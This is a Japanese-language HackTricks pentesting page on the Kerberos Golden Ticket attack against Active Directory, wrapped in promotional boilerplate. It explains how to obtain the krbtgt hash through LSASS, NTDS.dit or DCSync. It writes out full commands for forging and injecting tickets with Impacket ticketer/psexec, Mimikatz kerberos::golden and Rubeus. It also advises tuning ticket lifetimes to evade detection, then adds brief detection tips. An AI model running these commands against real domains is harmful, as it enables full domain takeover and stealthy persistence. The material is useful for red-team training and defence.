# ゴールデンチケット

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じて、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする**
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する

</details>

## ゴールデンチケット

**ゴールデンチケット**攻撃は、**Active Directory（AD）krbtgtアカウントのNTLMハッシュを使用して、任意のユーザーを偽装した合法的なチケット発行チケット（TGT）を作成する**ことにあります。この技術は、**偽装されたユーザーとしてドメイン内の任意のサービスやマシンにアクセスできる**ため、特に有利です。**krbtgtアカウントの資格情報は自動的に更新されない**ことを覚えておくことが重要です。

krbtgtアカウントのNTLMハッシュを**取得する**ためには、さまざまな方法が利用できます。これは、ドメイン内の任意のドメインコントローラ（DC）にある**Local Security Authority Subsystem Service（LSASS）プロセス**または**NT Directory Services（NTDS.dit）ファイル**から抽出することができます。さらに、**DCsync攻撃を実行**することで、Mimikatzの**lsadump::dcsyncモジュール**やImpacketの**secretsdump.pyスクリプト**などのツールを使用してこのNTLMハッシュを取得する戦略もあります。これらの操作を行うには、通常は**ドメイン管理者権限または同等のアクセスレベルが必要**です。

NTLMハッシュはこの目的に適した方法として機能しますが、**運用上のセキュリティ上の理由から、Advanced Encryption Standard（AES）Kerberosキー（AES128およびAES256）を使用してチケットを偽造することが強く推奨**されています。
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Windowsから" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**ゴールデンチケットが注入**されたら、共有ファイル **(C$)** にアクセスしたり、サービスやWMIを実行したりできるため、**psexec** や **wmiexec** を使用してシェルを取得できます（winrmを介してシェルを取得することはできないようです）。

### 一般的な検知の回避

ゴールデンチケットを検知する最も一般的な方法は、**Kerberosトラフィックを検査**することです。デフォルトでは、MimikatzはTGTに **10年間署名**を行うため、それを使用して行われる後続のTGSリクエストで異常として目立ちます。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

`/startoffset`、`/endin`、`/renewmax` パラメータを使用して、開始オフセット、期間、および最大更新回数を制御します（すべて分単位）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
```markdown
残念ながら、TGTの寿命は4769の中に記録されていないため、Windowsイベントログでこの情報を見つけることはできません。ただし、**事前の4768がない4769を見る**ことができます。**TGTなしでTGSを要求することはできません**ので、発行されたTGTの記録がない場合、それがオフラインで偽造されたことを推測することができます。

この検出を**バイパスする**ために、ダイヤモンドチケットをチェックしてください：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 緩和

* 4624: アカウントログオン
* 4672: 管理者ログオン
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者が行うことができる他の小技は、デフォルトのドメイン管理者アカウントなど、**機密ユーザーの4769にアラートを設定する**ことです。

## 参考文献
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>！</strong></a></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や、**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で私を**フォロー**する。
* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>
```
